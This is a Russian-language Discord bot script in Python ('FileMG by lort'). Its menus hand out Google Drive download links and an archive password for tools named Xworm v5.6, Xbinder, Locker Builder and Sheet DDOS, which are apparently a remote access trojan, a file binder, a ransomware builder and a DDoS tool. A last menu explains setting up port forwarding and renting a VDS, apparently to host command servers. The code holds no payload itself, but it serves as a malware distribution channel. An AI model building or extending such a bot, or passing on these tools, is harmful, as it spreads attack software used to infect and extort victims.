import discord
from discord.ext import commands
import os
from discord.ui import Select, View

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents)

def mod_check():
    async def predicate(ctx):
        if ctx.author.guild_permissions.administrator or ctx.author.id == ctx.guild.owner_id:
            return True
        await ctx.send("❌ Нет прав", delete_after=5)
        return False
    return commands.check(predicate)

class FileMGSelect(Select):
    def __init__(self):
        options = [
            discord.SelectOption(label="Liberium 1.7 Opinion", description="Нажми чтобы получить ссылку", emoji="📦"),
            discord.SelectOption(label="Xworm v5.6", description="Нажми чтобы получить ссылку", emoji="📦"),
            discord.SelectOption(label="Liberium 1.7", description="Нажми чтобы получить ссылку", emoji="📦"),
        ]
        super().__init__(placeholder="Выберите инструмент...", options=options)

    async def callback(self, interaction: discord.Interaction):
        links = {
            "Liberium 1.7 Opinion": "https://drive.google.com/file/d/1xgo8yAqVWkXn3Tr9Aqf3zhc_z565lTIR/view?usp=sharing",
            "Xworm v5.6": "https://drive.google.com/file/d/1gvKrMApXUH7L9t58nG2VZbYwQwGV4Bqe/view?usp=sharing",
            "Liberium 1.7": "https://drive.google.com/file/d/1JDgkrktM3JVkHym8L78FVqsJpK9vzZmD/view?usp=sharing",
        }
        selected = self.values[0]
        link = links[selected]
        embed = discord.Embed(title=f"📥 {selected}", description=f"[**Скачать {selected}**]({link})", color=discord.Color.purple())
        embed.set_footer(text="FileMG | by lort")
        await interaction.response.send_message(embed=embed, ephemeral=True)

class FileMGView(View):
    def __init__(self):
        super().__init__(timeout=None)
        self.add_item(FileMGSelect())

@bot.command(name="filemg")
@mod_check()
async def filemg(ctx):
    embed = discord.Embed(title="Выберите инструмент из категории", description="Выберите вариант в меню ниже, чтобы просмотреть подробную информацию и получить ссылку для скачивания.", color=discord.Color.purple())
    embed.set_image(url="https://media.discordapp.net/attachments/1273284092309540877/1496209627161825380/standard.gif?ex=69e90d4d&is=69e7bbcd&hm=a8abc020669c3fe1a02f3637318c2ce4e06de6acbc3b6384d16ac2c5b67d5da1&=")
    embed.set_footer(text="FileMG | by lort  пароль - EzSq")
    await ctx.send(embed=embed, view=FileMGView())
    await ctx.message.delete()

class FileMG2Select(Select):
    def __init__(self):
        options = [
            discord.SelectOption(label="NetFoxTool", description="Нажми чтобы получить ссылку", emoji="📦"),
            discord.SelectOption(label="Sheet DDOS", description="Нажми чтобы получить ссылку", emoji="📦"),
        ]
        super().__init__(placeholder="Выберите инструмент...", options=options)

    async def callback(self, interaction: discord.Interaction):
        links = {
            "NetFoxTool": "https://drive.google.com/file/d/1KJtZ-QpWZHIz_8R068ck6utpu74lUY4a/view",
            "Sheet DDOS": "https://drive.google.com/file/d/1sLEfJzSj6iPReaQtwnMJB_XyRl_lrmnh/view?usp=sharing",
        }
        selected = self.values[0]
        link = links[selected]
        embed = discord.Embed(title=f"📥 {selected}", description=f"[**Скачать {selected}**]({link})", color=discord.Color.purple())
        embed.set_footer(text="FileMG | by lort")
        await interaction.response.send_message(embed=embed, ephemeral=True)

class FileMG2View(View):
    def __init__(self):
        super().__init__(timeout=None)
        self.add_item(FileMG2Select())

@bot.command(name="filemg2")
@mod_check()
async def filemg2(ctx):
    embed = discord.Embed(title="Выберите инструмент из категории", description="Выберите вариант в меню ниже, чтобы просмотреть подробную информацию и получить ссылку для скачивания.", color=discord.Color.purple())
    embed.set_image(url="https://media.discordapp.net/attachments/1273284092309540877/1496209627161825380/standard.gif?ex=69e90d4d&is=69e7bbcd&hm=a8abc020669c3fe1a02f3637318c2ce4e06de6acbc3b6384d16ac2c5b67d5da1&=")
    embed.set_footer(text="FileMG | by lort пароль EzSq")
    await ctx.send(embed=embed, view=FileMG2View())
    await ctx.message.delete()

class FileMG3Select(Select):
    def __init__(self):
        options = [
            discord.SelectOption(label="Xbinder", description="Нажми чтобы получить ссылку", emoji="📦"),
        ]
        super().__init__(placeholder="Выберите инструмент...", options=options)

    async def callback(self, interaction: discord.Interaction):
        links = {
            "Xbinder": "https://drive.google.com/file/d/1Z-zKWvcVii0lt7DfhgFql8_sGQoxqKvJ/view?usp=sharing",
        }
        selected = self.values[0]
        link = links[selected]
        embed = discord.Embed(title=f"📥 {selected}", description=f"[**Скачать {selected}**]({link})", color=discord.Color.purple())
        embed.set_footer(text="FileMG | by lort")
        await interaction.response.send_message(embed=embed, ephemeral=True)

class FileMG3View(View):
    def __init__(self):
        super().__init__(timeout=None)
        self.add_item(FileMG3Select())

@bot.command(name="filemg3")
@mod_check()
async def filemg3(ctx):
    embed = discord.Embed(title="Выберите инструмент из категории", description="Выберите вариант в меню ниже, чтобы просмотреть подробную информацию и получить ссылку для скачивания.", color=discord.Color.purple())
    embed.set_image(url="https://media.discordapp.net/attachments/1273284092309540877/1496209627161825380/standard.gif?ex=69e90d4d&is=69e7bbcd&hm=a8abc020669c3fe1a02f3637318c2ce4e06de6acbc3b6384d16ac2c5b67d5da1&=")
    embed.set_footer(text="FileMG | by lort пароль EzSq")
    await ctx.send(embed=embed, view=FileMG3View())
    await ctx.message.delete()

class FileMG4Select(Select):
    def __init__(self):
        options = [
            discord.SelectOption(label="Locker Builder", description="Нажми чтобы получить ссылку", emoji="📦"),
        ]
        super().__init__(placeholder="Выберите инструмент...", options=options)

    async def callback(self, interaction: discord.Interaction):
        links = {
            "Locker Builder": "https://drive.google.com/file/d/1NMQqTxo1-d1WAh-68MgAn1eASdqANdN2/view?usp=sharing",
        }
        selected = self.values[0]
        link = links[selected]
        embed = discord.Embed(title=f"📥 {selected}", description=f"[**Скачать {selected}**]({link})", color=discord.Color.purple())
        embed.set_footer(text="FileMG | by lort пароль EzSq")
        await interaction.response.send_message(embed=embed, ephemeral=True)

class FileMG4View(View):
    def __init__(self):
        super().__init__(timeout=None)
        self.add_item(FileMG4Select())

@bot.command(name="filemg4")
@mod_check()
async def filemg4(ctx):
    embed = discord.Embed(title="Выберите инструмент из категории", description="Выберите вариант в меню ниже, чтобы просмотреть подробную информацию и получить ссылку для скачивания.", color=discord.Color.purple())
    embed.set_image(url="https://media.discordapp.net/attachments/1273284092309540877/1496209627161825380/standard.gif?ex=69e90d4d&is=69e7bbcd&hm=a8abc020669c3fe1a02f3637318c2ce4e06de6acbc3b6384d16ac2c5b67d5da1&=")
    embed.set_footer(text="FileMG | by lort")
    await ctx.send(embed=embed, view=FileMG4View())
    await ctx.message.delete()
class FileMG5Select(Select):
    def __init__(self):
        options = [
            discord.SelectOption(label="Portmap", description="Нажми чтобы получить ссылку", emoji="🚀"),
            discord.SelectOption(label="Cloudpad", description="Нажми чтобы получить ссылку", emoji="🚀"),
            discord.SelectOption(label="VDS (дедик)", description="Нажми чтобы получить ссылку", emoji="🚀"),
        ]
        super().__init__(placeholder="Выберите инструмент...", options=options)

    async def callback(self, interaction: discord.Interaction):
        selected = self.values[0]

        if selected == "Portmap":
            embed = discord.Embed(color=discord.Color.purple())
            embed.add_field(
                name="📦 Portmap",
                value="Ссылка на сайт ᴘᴏʀᴛᴍᴀᴘ - [тык](https://portmap.io)\nopenvpn - [тык](https://openvpn.net/client/)",
                inline=False
            )

        elif selected == "Cloudpad":
            embed = discord.Embed(color=discord.Color.purple())
            embed.add_field(
                name="📦 Cloudpad",
                value="ᴄᴄыᴧᴋᴀ нᴀ ᴄʟᴏᴜᴅᴘᴀᴅ [ᴛыᴋ](https://cloudpad.ru) зᴀходиʍ нᴀ ᴄᴀйᴛ, ᴩᴇᴦиᴄᴛᴩиᴩуᴇʍᴄя и ᴄᴋᴀчиʙᴀᴇʍ ɸᴀйᴧ ᴄʟᴏᴜᴅᴘᴀᴅ.\n\nоᴛᴋᴩыʙᴀᴇʍ ᴄʟᴏᴜᴅᴘᴀᴅ и нᴀ ᴄᴀйᴛᴇ ᴨодʙязыʙᴀᴇʍ ноʍᴇᴩ (ʙ ᴨᴩиᴧожᴇнии ноʍᴇᴩ ᴨодʙязыʙᴀᴛь нᴇᴧьзя, ʙᴀᴄ ᴨᴩоᴄᴛо ʙыᴋинᴇᴛ из ᴀᴋᴋᴀунᴛᴀ). зᴀᴛᴇʍ зᴀходиʍ обᴩᴀᴛно ʙ ᴨᴩиᴧожᴇниᴇ, ᴨᴇᴩᴇходиʍ ʙо ʙᴋᴧᴀдᴋу \"ᴨубᴧиᴋᴀции\" и нᴀжиʍᴀᴇʍ \"добᴀʙиᴛь\".\n\nᴨᴩоᴛоᴋоᴧ бᴇᴩᴇʍ ᴛᴄᴘ. изнᴀчᴀᴧьно у ʙᴀᴄ будᴇᴛ ʜᴛᴛᴘ.\nʙᴄᴛᴀʙᴧяᴇʍ ᴨоᴩᴛы: ᴄʟᴏᴜᴅᴘᴜʙ.ʀᴜ:45454 (бᴇз ᴛᴄᴘ).",
                inline=False
            )

        elif selected == "VDS (дедик)":
            embed = discord.Embed(color=discord.Color.purple())
            embed.add_field(
                name="📦 VDS (дедик)",
                value="Купить дедик с сайта one dash - [тык](https://onedash.ru)\nОтключить запрет/впн перед заходом на сайт!",
                inline=False
            )

        embed.set_footer(text="FileMG | by lort пароль EzSq")
        await interaction.response.send_message(embed=embed, ephemeral=True)


class FileMG5View(View):
    def __init__(self):
        super().__init__(timeout=None)
        self.add_item(FileMG5Select())


@bot.command(name="filemg5")
@mod_check()
async def filemg5(ctx):
    embed = discord.Embed(
        title="Выберите инструмент из категории",
        description="Выберите вариант в меню ниже, чтобы просмотреть подробную информацию и получить ссылку для скачивания.",
        color=discord.Color.purple()
    )
    embed.set_image(url="https://media.discordapp.net/attachments/1273284092309540877/1496209627161825380/standard.gif?ex=69e90d4d&is=69e7bbcd&hm=a8abc020669c3fe1a02f3637318c2ce4e06de6acbc3b6384d16ac2c5b67d5da1&=")
    embed.set_footer(text="FileMG | by lort пароль EzSq")
    await ctx.send(embed=embed, view=FileMG5View())
    await ctx.message.delete()    

@bot.event
async def on_ready():
    print(f"Бот запущен: {bot.user}")

bot.run(os.getenv("TOKEN"))
